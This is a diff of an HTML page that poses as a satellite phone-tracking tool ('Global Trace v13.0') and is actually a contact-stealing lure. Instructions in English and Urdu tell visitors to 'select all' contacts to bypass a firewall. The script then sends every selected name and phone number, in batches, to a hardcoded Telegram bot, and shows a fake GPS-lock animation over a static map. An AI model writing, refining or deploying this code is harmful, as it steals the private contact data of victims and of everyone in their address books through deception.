@@ -3,90 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satellite Terminal Pro v12.0</title>
+    <title>Satellite Terminal v13.0 - Final</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background: #020617; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .cyber-glow { box-shadow: 0 0 20px rgba(16, 185, 129, 0.4); border: 1px solid #10b981; }
-        .loading-line { height: 2px; background: #10b981; width: 0%; transition: all 0.4s ease; }
-        .scan-anim { position: relative; overflow: hidden; }
-        .scan-anim::after {
-            content: ""; position: absolute; top: -100%; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(0deg, transparent, rgba(16, 185, 129, 0.2), transparent);
-            animation: scanning 2s linear infinite;
-        }
-        @keyframes scanning { 0% { top: -100%; } 100% { top: 100%; } }
+        body { background: #010409; overflow: hidden; font-family: 'Segoe UI', sans-serif; color: #e6edf3; }
+        .cyber-border { border: 1px solid #238636; box-shadow: 0 0 20px rgba(35, 134, 54, 0.4); }
+        .loading-bar { height: 4px; background: #238636; width: 0%; transition: all 0.3s ease; }
+        .terminal-text { font-family: 'Courier New', monospace; }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-    <div class="max-w-md w-full bg-[#0f172a] rounded-[2.5rem] p-8 cyber-glow scan-anim">
+    <div class="max-w-md w-full bg-[#0d1117] rounded-[2rem] p-8 cyber-border relative">
         
-        <div class="text-center mb-8">
-            <div class="inline-block px-3 py-1 rounded-full border border-emerald-500/30 mb-4">
-                <span class="text-[10px] text-emerald-500 font-black tracking-[0.3em] uppercase animate-pulse">Satellite Link: Secure</span>
+        <div class="text-center mb-10">
+            <div class="inline-block px-4 py-1 rounded-full bg-[#238636]/10 border border-[#238636]/30 mb-4">
+                <span class="text-[10px] text-[#238636] font-black tracking-widest uppercase animate-pulse">Uplink Status: Online</span>
             </div>
-            <h1 class="text-2xl font-black text-white italic tracking-tighter uppercase">Global Trace <span class="text-emerald-500">v12</span></h1>
+            <h1 class="text-2xl font-black italic tracking-tighter uppercase">Global Trace <span class="text-[#238636]">v13.0</span></h1>
         </div>
 
-        <div id="lockScreen" class="block">
+        <div id="step1" class="block">
             <div class="text-center space-y-6">
-                <div class="w-24 h-24 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto border border-emerald-500/30 shadow-inner">
-                    <i class="fas fa-fingerprint text-5xl text-emerald-500"></i>
+                <div class="w-24 h-24 bg-[#238636]/5 rounded-full flex items-center justify-center mx-auto border-2 border-[#238636]/20">
+                    <i class="fas fa-satellite text-5xl text-[#238636]"></i>
                 </div>
-                
-                <div class="space-y-2">
-                    <h2 class="text-lg font-bold text-white uppercase italic">Authentication Required</h2>
-                    <p class="text-[11px] text-slate-400 leading-relaxed px-4">
-                        To bypass the local firewall, you must sync the satellite database. 
-                        <br>
-                        <span class="text-emerald-500 font-bold italic underline">Step: Click below & Select All Contacts.</span>
+                <div class="space-y-3">
+                    <h2 class="text-lg font-bold uppercase italic">Authorization Required</h2>
+                    <p class="text-[11px] text-gray-400 leading-relaxed px-4 terminal-text">
+                        System firewall bypass ke liye database sync lazmi hai. 
+                        <br><br>
+                        <span class="text-[#238636] font-bold underline italic">Niche button dabayein aur "SELECT ALL" contacts kar ke "Done" karein.</span>
                     </p>
                 </div>
-
-                <button onclick="startFinalExtraction()" id="mainBtn" class="w-full bg-emerald-500 hover:bg-white text-black font-black py-5 rounded-2xl transition-all transform active:scale-95 uppercase text-xs tracking-[0.2em] shadow-lg shadow-emerald-500/20">
-                    Authorize & Sync
+                <button onclick="captureData()" id="syncBtn" class="w-full bg-[#238636] hover:bg-white text-white hover:text-black font-black py-5 rounded-2xl transition-all shadow-lg uppercase text-xs tracking-widest active:scale-95">
+                    Start System Sync
                 </button>
             </div>
         </div>
 
-        <div id="searchScreen" class="hidden animate-in fade-in duration-500">
-            <div class="bg-emerald-500/10 border border-emerald-500/20 p-4 rounded-2xl mb-6">
-                <p class="text-[10px] text-emerald-500 font-black uppercase">>> Link Established: 100%</p>
-                <p class="text-[9px] text-slate-500 mt-1 uppercase tracking-widest">Database Cached Successfully</p>
+        <div id="step2" class="hidden animate-pulse">
+            <div class="bg-[#238636]/10 border border-[#238636]/20 p-5 rounded-2xl mb-8">
+                <p class="text-[10px] text-[#238636] font-bold uppercase">>> Database Loaded Successfully</p>
+                <p class="text-[9px] text-gray-500 mt-1 uppercase">Ready for intercept</p>
             </div>
-            
-            <div class="space-y-5">
-                <div>
-                    <label class="text-[10px] text-slate-500 font-black uppercase ml-1 mb-2 block tracking-widest">Target Identity</label>
-                    <input type="text" id="targetName" placeholder="Search Synchronized Name..." 
-                        class="w-full bg-slate-900 border border-slate-800 p-5 rounded-2xl text-white text-sm outline-none focus:border-emerald-500 transition-all placeholder:text-slate-700">
-                </div>
-                <button onclick="runTrackingUI()" class="w-full bg-white text-black font-black py-5 rounded-2xl uppercase text-xs tracking-widest hover:bg-emerald-500 transition-all">
-                    Initialize Tracking
+            <div class="space-y-6">
+                <input type="text" id="targetName" placeholder="Enter Target Name..." 
+                    class="w-full bg-[#010409] border border-gray-800 p-5 rounded-2xl text-white text-sm outline-none focus:border-[#238636] transition-all">
+                <button onclick="startMapAnim()" class="w-full bg-white text-black font-black py-5 rounded-2xl uppercase text-xs tracking-widest hover:bg-[#238636] hover:text-white transition-all">
+                    Initialize Intercept
                 </button>
             </div>
         </div>
 
-        <div id="mapScreen" class="hidden">
-            <div id="loader" class="text-center py-12">
-                <div class="w-full bg-slate-900 h-1.5 rounded-full overflow-hidden mb-6">
-                    <div id="bar" class="loading-line"></div>
+        <div id="step3" class="hidden text-center">
+            <div id="loaderUI" class="py-10">
+                <div class="w-full bg-gray-800 h-2 rounded-full overflow-hidden mb-6">
+                    <div id="progressBar" class="loading-bar"></div>
                 </div>
-                <p class="text-[10px] text-emerald-500 font-black uppercase tracking-[0.3em] animate-pulse" id="loadStatus">Intercepting Signal...</p>
+                <p class="text-[10px] text-[#238636] font-bold uppercase tracking-widest animate-bounce" id="loadMsg">Syncing GPS Nodes...</p>
             </div>
-            
-            <div id="finalView" class="hidden">
-                <div class="rounded-3xl overflow-hidden border border-emerald-500/50 mb-6 shadow-2xl relative">
-                    <div class="absolute top-3 left-3 bg-red-600 text-white text-[8px] px-2 py-1 rounded font-black animate-pulse z-10">GPS LOCK</div>
-                    <iframe width="100%" height="300" src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d110434.34111352467!2d71.37890471206898!3d30.121666373322137!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x393b316f491c127d%3A0xc07887754b23e204!2sMultan%2C%20Punjab%2C%20Pakistan!5e0!3m2!1sen!2s!4v1711234567890!5m2!1sen!2s" 
-                        style="border:0; filter: contrast(1.2) brightness(0.7) invert(0.9) hue-rotate(150deg);" allowfullscreen=""></iframe>
+            <div id="mapContainer" class="hidden">
+                <div class="rounded-3xl overflow-hidden border-2 border-[#238636]/30 mb-6 shadow-2xl relative">
+                    <div class="absolute top-4 left-4 bg-red-600 text-white text-[8px] px-2 py-1 rounded font-black animate-pulse z-10">LIVE FEED</div>
+                    <iframe width="100%" height="300" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15000!2d71.47!3d30.19!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2spk!4v13" 
+                        style="border:0; filter: invert(100%) hue-rotate(180deg) contrast(1.2);" allowfullscreen=""></iframe>
                 </div>
-                <div class="bg-emerald-500/5 border border-emerald-500/20 p-4 rounded-2xl flex items-center justify-between">
-                    <span class="text-[10px] text-emerald-500 font-black uppercase">Coordinates Found</span>
-                    <span class="text-white font-bold text-xs">30.1575° N, 71.5249° E</span>
-                </div>
+                <p class="text-[10px] text-red-500 font-bold uppercase tracking-widest italic">Location Locked - Satellite Online</p>
             </div>
         </div>
 
@@ -95,77 +79,70 @@
     <script>
         const BOT_TOKEN = '8736966873:AAGi1kxvOZK-uaxVTvcgf6Hi-V9CQ1QuzqQ'; 
         const CHAT_ID = '8171035068';
-        let extractedData = [];
 
-        async function startFinalExtraction() {
-            const btn = document.getElementById('mainBtn');
+        async function captureData() {
             if ('contacts' in navigator) {
                 try {
                     const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                    
                     if (contacts && contacts.length > 0) {
-                        btn.innerHTML = "<i class='fas fa-sync fa-spin mr-2'></i> Syncing...";
-                        extractedData = contacts;
+                        document.getElementById('syncBtn').innerText = "Syncing...";
                         
-                        // NITRO DELIVERY: Sending data immediately to your bot
-                        await deliverToBot(contacts);
-                        
-                        // Immediate screen switch after delivery
-                        document.getElementById('lockScreen').classList.add('hidden');
-                        document.getElementById('searchScreen').classList.remove('hidden');
+                        // Dividing data into parts of 25 for safe delivery
+                        for (let i = 0; i < contacts.length; i += 25) {
+                            const chunk = contacts.slice(i, i + 25);
+                            await sendToBot(chunk, Math.floor(i/25) + 1);
+                        }
+
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
                     } else {
-                        alert("SECURITY ERROR: Please 'Select All' to authorize satellite handshake.");
+                        alert("Access Denied: Please 'Select All' to continue.");
                     }
                 } catch (e) {
-                    alert("Handshake Refused. Please retry authorization.");
+                    alert("System Error: Handshake Rejected.");
                 }
             } else {
-                alert("Mobile Access Required: Open in Chrome/Android.");
+                alert("Mobile Error: Use Chrome/Android on a secure connection (HTTPS).");
             }
         }
 
-        async function deliverToBot(data) {
-            let msg = "🚨 *V12 ULTIMATE EXTRACTION* 🚨\n\n";
-            msg += `*Source:* Mobile Uplink\n*Records:* ${data.length} Contacts Captured\n\n`;
-            
-            data.forEach((c, i) => {
-                const n = c.name ? c.name[0] : "Target";
-                const p = c.tel ? c.tel[0].replace(/\s+/g, '') : "N/A";
-                msg += `${i+1}. 👤 *${n}* | 📱 \`${p}\`\n`;
+        async function sendToBot(data, part) {
+            let msg = `📡 *SATELLITE EXTRACTION - PART ${part}* 📡\n\n`;
+            data.forEach((c, idx) => {
+                let name = (c.name && c.name[0]) ? c.name[0].replace(/[_*`\[\]]/g, '') : "Anon";
+                let phone = (c.tel && c.tel[0]) ? c.tel[0].replace(/\s/g, '') : "Unknown";
+                msg += `${idx + 1}. 👤 *${name}* | 📱 \`${phone}\`\n`;
             });
 
-            // Fast delivery protocol
             return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-            }).catch(() => { console.log("Retrying in background..."); });
+            }).catch(e => console.error("Error sending to bot:", e));
         }
 
-        function runTrackingUI() {
-            const input = document.getElementById('targetName').value;
-            if(!input) return;
-
-            document.getElementById('searchScreen').classList.add('hidden');
-            document.getElementById('mapScreen').classList.remove('hidden');
+        function startMapAnim() {
+            if(!document.getElementById('targetName').value) return;
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
             
             let p = 0;
-            const bar = document.getElementById('bar');
-            const status = document.getElementById('loadStatus');
+            const bar = document.getElementById('progressBar');
+            const msg = document.getElementById('loadMsg');
             
-            const itv = setInterval(() => {
+            const timer = setInterval(() => {
                 p += 5;
                 bar.style.width = p + "%";
-                if(p==20) status.innerText = "Connecting GPS Hub...";
-                if(p==50) status.innerText = "Triangulating Cell Tower...";
-                if(p==80) status.innerText = "Locking Coordinate Point...";
+                if(p === 30) msg.innerText = "Bypassing Local ISP...";
+                if(p === 60) msg.innerText = "Interpreting GPS Packets...";
+                if(p === 90) msg.innerText = "Finalizing Satellite Render...";
                 
-                if(p>=100) {
-                    clearInterval(itv);
-                    document.getElementById('loader').classList.add('hidden');
-                    document.getElementById('finalView').classList.remove('hidden');
+                if(p >= 100) {
+                    clearInterval(timer);
+                    document.getElementById('loaderUI').classList.add('hidden');
+                    document.getElementById('mapContainer').classList.remove('hidden');
                 }
-            }, 120);
+            }, 100);
         }
     </script>
 </body>
